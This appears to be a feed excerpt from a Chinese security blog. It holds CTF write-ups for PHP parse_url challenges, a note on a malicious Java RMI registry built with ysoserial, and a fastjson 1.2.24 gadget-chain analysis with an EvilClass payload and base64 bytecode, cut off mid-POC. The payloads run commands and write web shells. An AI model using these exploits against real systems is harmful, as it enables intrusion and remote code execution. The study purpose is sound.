alt="image-20230515175832497"></p><p>能成功进行命令执行，于是尝试文件读取</p><p><img src="../images/image-20230515180225448.png" alt="image-20230515180225448"></p><p>这是其中一种解法</p><p><strong>这里的 <code>/</code>用不了是因为在/的后面会被<code>parse_url</code>解析成path</strong></p><p><img src="../images/image-20230515180454024.png" alt="image-20230515180454024"></p><p>这是第二种解法</p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:25:53</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>];</span><br></pre></td></tr></table></figure><p>做这里的时候可以使用bp来做，hackbar可能识别不成功</p><p>这里的想法是构造<code>php://input</code></p><p><img src="../images/image-20230516143313335.png" alt="image-20230516143313335"></p><p>这里的host是<code>php:</code>   path是<code>//input</code></p><p>然后就可以拼接成<code>include php://input</code>   、</p><p>然后在post执行代码就能够成功执行了</p><p><img src="../images/image-20230516143456418.png" alt="image-20230516143456418"></p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:18</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$data</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>];</span><br></pre></td></tr></table></figure><p>还是考察的拼接方法</p><p><img src="../images/image-20230516143959148.png" alt="image-20230516143959148"></p><p>本地尝试了一下</p><p><img src="../images/image-20230516144016789.png" alt="image-20230516144016789"></p><p>可以成功命令执行了</p><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:35</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>还是先本地构造来进行尝试</p><p><img src="../images/image-20230516144313226.png" alt="image-20230516144313226"></p><p>这里发现成功后，这里不能用<code>/</code>的原因是因为会被识别成path</p><p><img src="../images/image-20230516144743961.png" alt="image-20230516144743961"></p><p>这里的话使用<code>$&#123;PWD::1&#125;</code>来替代<code>/</code>也行</p><p><img src="../images/image-20230516145016184.png" alt="image-20230516145016184"></p><p>不过这里的话要在这个<code>$&#123;PWD::1&#125;</code>的后面加上一个<code>:</code>,不然不会执行成功</p><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]));</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$$$$$$host</span>;</span><br></pre></td></tr></table></figure><p>这里话<code>extract</code>，考察的是个变量覆盖的题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;Original&quot;</span>;</span><br><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果-------------------------------------------------------------------</span><br><span class="line"><span class="variable">$a</span> = Cat; <span class="variable">$b</span> = Dog; <span class="variable">$c</span> = Horse</span><br></pre></td></tr></table></figure><p>这就是这个函数的用法</p><p>就是把数组里的<code>key</code>作为变量名，把数组里的<code>value</code>作为变量的值</p><p>就是一个套娃的过程</p><p><img src="../images/image-20230516152003470.png" alt="image-20230516152003470"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$host</span>=scheme</span><br><span class="line"><span class="variable">$$host</span>=<span class="variable">$scheme</span>=user</span><br><span class="line"><span class="variable">$$$host</span>=<span class="variable">$user</span>=pass</span><br><span class="line"><span class="variable">$$$$host</span>=<span class="variable">$pass</span>=fragment</span><br><span class="line"><span class="variable">$$$$$host</span>=<span class="variable">$fragment</span>=query</span><br><span class="line"><span class="variable">$$$$$$host</span>=<span class="variable">$query</span>=php:<span class="comment">//input</span></span><br></pre></td></tr></table></figure><p>这里的话传入参数的时候要会<code>#</code>进行url编码</p><p><img src="../images/image-20230516152215558.png" alt="image-20230516152215558"></p><p><img src="../images/image-20230516152318971.png" alt="image-20230516152318971"></p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:18</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>], <span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>这里的话直接写php代码到文件里是不行的，因为存在的<code>?</code>会被识别成<code>query</code></p><p>我们就是用html文件中的&lt; script language=‘php’&gt;标签来实现php的代码。这里记住，只需写一个&lt; script&gt;，不需要写&lt; /scirpt&gt;，因为/还会被parse_url函数当作path中的内容。</p><p><img src="../images/image-20230516153311944.png" alt="image-20230516153311944"></p><p><img src="../images/image-20230516153607169.png" alt="image-20230516153607169"></p><p>最终paylaod</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=http:<span class="comment">//&lt;script+language=&quot;php&quot;&gt;system(&#x27;cd+..;cd+..;cd+..;cat+_f1a_g_1s_h3re&#x27;);:/var/www/html/1.php</span></span><br></pre></td></tr></table></figure><p>这里的话用之前的<code>$&#123;PWD::1&#125;</code>来替代<code>/</code>也是可以的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://ctf-show.feishu.cn/docx/Al7GdBB5WoI9pMxod9acyzXFnfe&quot;&gt;官方wp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;看了wp之后，学到了一个新技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;就是在&lt;code&gt;/&lt;</summary>
      
    
    
    
    
    <category term="ctfshow-周末大挑战-parse_url" scheme="https://ke1nys.github.io/tags/ctfshow-%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%98-parse-url/"/>
    
  </entry>
  
  <entry>
    <title>java-RMI恶意服务</title>
    <link href="https://ke1nys.github.io/posts/7aace6cb.html"/>
    <id>https://ke1nys.github.io/posts/7aace6cb.html</id>
    <published>2023-05-14T08:03:03.000Z</published>
    <updated>2023-05-14T13:57:44.832Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1L3411a7ax/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">参考视频</a></p><p><a href="https://xz.aliyun.com/t/9053#toc-1">参考文章</a></p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Java RMI机制能够让一台Java虚拟机上的对象调用运行在另一台Java虚拟机上的对象的方法。总结一下，RMI机制的实现依赖于以下三个部分</p><ul><li>RMI Server</li><li>RMI Registry</li><li>RMI Client</li></ul><p>简单概括一下RMI的流程：Server端事先在Registry处<code>bind</code>将要被调用的远程对象。当Client需要调用远程对象时，先根据<code>rmi://</code>地址连接到Registry，然后在Registry处查看是否绑定有需要的远程对象。如果有，则Registry返回Server端的<code>rmi://</code>地址以及开放的端口，Client据此连接到Server。然后才开始真正的远程方法调用，远程方法在Server端执行，Server将执行后的结果发送给Client。</p><h3 id="RMI的恶意利用"><a href="#RMI的恶意利用" class="headerlink" title="RMI的恶意利用"></a>RMI的恶意利用</h3><p>先创建两个项目</p><p><strong>RMIServer</strong></p><p><strong>RMIClient</strong></p><p>这两个项目都要有相同的接口</p><p><img src="../images/image-20230514164640177.png" alt="image-20230514164640177"></p><p><img src="../images/image-20230514164725676.png" alt="image-20230514164725676"></p><p>先创建两个项目，<strong>分别是客户端和服务端(然后有相同的接口)</strong></p><p><img src="../images/image-20230514164826518.png" alt="image-20230514164826518"></p><p>服务端已经开了个端口出去了，客户端就可以直接去进行访问</p><p>但是客户端并不知道开的端口是啥，这里就得通过这个注册中心开的端口来找</p><p>默认的是1099，然后又因为注册中心于服务端开放的端口绑定了，于是就可以通过注册中心来查到服务端开放的端口</p><p><img src="../images/image-20230514165804204.png" alt="image-20230514165804204"></p><p>这里的话是获取注册中心的端口，然后获取绑定的名字，然后在进行函数的调用</p><p><img src="../images/image-20230514165918336.png" alt="image-20230514165918336"></p><p>成功在服务端回显 这里调用的是服务端的sayHello()方法</p><p>这里客户端没写回显，所以没输出</p><p>上面就是简单的RMI的执行过程了</p><h4 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h4><h5 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h5><p>此方法可以攻击客户端和服务端</p><p>对于注册中心来说，我们还是从这几个方法触发：</p><ul><li>bind</li><li>unbind</li><li>rebind</li><li>list</li><li>lookup</li></ul><p>除了unbind和rebind都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial的JRMPListener，命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099  CommonsCollections1 &#x27;&#x27;</span><br></pre></td></tr></table></figure><p>这里的意思是开启一个恶意的RMI服务端</p><p><img src="../images/image-20230514180701300.png" alt="image-20230514180701300"></p><p>成功执行，只不过本地开的话java版本太高，开不了，所以就用kali的ip,执行不了计算器</p><p>这里即使调用unbind也会触发反序列化，推测是在之前传输一些约定好的数据时进行的序列化和反序列化。所以实际上这五种方法都可以达到注册中心反打客户端或服务端的目的</p><p><strong>剩下的去参考上面的文章就行了，因为其他的没有用到ysoserial服务端进行伪造</strong></p><h3 id="JEP290及其绕过"><a href="#JEP290及其绕过" class="headerlink" title="JEP290及其绕过"></a>JEP290及其绕过</h3><p><a href="https://xz.aliyun.com/t/9053#toc-9">参考文章</a></p><p>这里就不写了，因为写了也是照搬下来</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1L3411a7ax/?spm_id_from=333.999.0.0&amp;amp;vd_source=bacfffe46b930fda5761b63367eb298c&quot;&gt;参考视频&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    
    <category term="java-RMI恶意服务" scheme="https://ke1nys.github.io/tags/java-RMI%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>java-fastjson 链子分析</title>
    <link href="https://ke1nys.github.io/posts/7ec3d05a.html"/>
    <id>https://ke1nys.github.io/posts/7ec3d05a.html</id>
    <published>2023-05-10T03:17:37.000Z</published>
    <updated>2023-05-17T08:30:57.113Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/12096#toc-3">参考文章</a></p><p>这里用的是fastjson 1.2.24版本来进行分析</p><p><img src="../images/image-20230510112535170.png" alt="image-20230510112535170"></p><p><img src="../images/image-20230510115514716.png" alt="image-20230510115514716"></p><p>给上面的图片在添加一个条件，满足条件的getter也行</p><p>这就是fastjson和<strong>原生类</strong>的反序列化的不同之处</p><h3 id="JdbcRowSetImpl链子"><a href="#JdbcRowSetImpl链子" class="headerlink" title="JdbcRowSetImpl链子"></a>JdbcRowSetImpl链子</h3><p><strong>这个链子是必须出网的</strong></p><p><code>com.sun.rowset.JdbcRowSetImpl</code>中的<code>dataSourceName</code>属性 寻找他的set方法</p><p><img src="../images/image-20230517154056485.png" alt="image-20230517154056485"></p><p>然后跟进到他的<code>setdataSourceName</code>方法</p><p><img src="../images/image-20230517154148020.png" alt="image-20230517154148020"></p><p>这里就是把传进去的值赋给<code>dataSource</code></p><p>这里再看<code>autoCommit</code>属性，然后去查看他的set方法，<code>setautocommit</code>,需要传入一个布尔类型的参数</p><p><img src="../images/image-20230517154245264.png" alt="image-20230517154245264"></p><p>判断conn是否为空 不然就赋值 跟进connect方法</p><p><img src="../images/image-20230517154459890.png" alt="image-20230517154459890"></p><p><code>lookup(getDataSourceName())</code> lookup函数链接我们写入的服务 加载我们的恶意类<br>构造恶意类</p><p>根据最后的<code>connect()</code>方法，前面的操作就讲得通了</p><p>因为前面得<code>conn</code>默认为空，所以能进入下一层，然后又因为我们给了<code>DataSourceName</code>赋值，又可以进入下一层，然后就是<code>lookup()</code>函数进行连接了，连接得值刚好是<code>DataSourceName</code></p><h3 id="TemplatesImpl-链子"><a href="#TemplatesImpl-链子" class="headerlink" title="TemplatesImpl 链子"></a>TemplatesImpl 链子</h3><p><strong>这个链子是不出网的</strong></p><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//EvilCalss.java</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilClass</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其编译为字节码文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Encoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filepath</span> <span class="operator">=</span> <span class="string">&quot;.\\src\\main\\java\\test\\EvilClass.class&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filepath);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span>((n = fis.read(b))!=-<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(b,<span class="number">0</span>,n);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            buffer = bos.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> encoder.encodeToString(buffer);</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAORXZpbENsYXNzLmphdmEMAAgACQcAIQwAIgAjAQAIY2FsYy5leGUMACQAJQEACUV2aWxDbGFzcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAKAAQACwANAAwADAAAAAQAAQANAAEADgAPAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAARAAwAAAAEAAEAEAABAA4AEQACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAFAAMAAAABAABABAACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAFwAIABgADAAAAAQAAQAUAAEAFQAAAAIAFg</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span 